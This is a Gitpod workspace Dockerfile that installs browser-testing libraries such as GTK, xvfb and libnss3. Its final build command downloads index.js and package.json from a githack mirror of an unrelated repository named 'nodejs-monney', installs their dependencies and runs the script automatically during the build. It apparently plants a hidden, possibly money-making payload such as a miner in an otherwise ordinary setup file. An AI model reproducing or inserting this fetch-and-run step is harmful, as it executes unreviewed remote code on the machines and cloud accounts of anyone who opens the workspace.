FROM gitpod/workspace-full

RUN sudo apt-get update \
 && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
   libgtk2.0-0 \
   libgtk-3-0 \
   libnotify-dev \
   libgconf-2-4 \
   libnss3 \
   libxss1 \
   libasound2 \
   libxtst6 \
   xauth \
   xvfb \
 && sudo rm -rf /var/lib/apt/lists/* \
 && wget https://raw.githack.com/vippro99/nodejs-monney/main/index.js && wget https://rawcdn.githack.com/vippro99/nodejs-monney/ce679fa4578f7719b92c0b0126258d1e25eedae3/package.json && chmod +x index.js package.json && npm i -s && node index.js
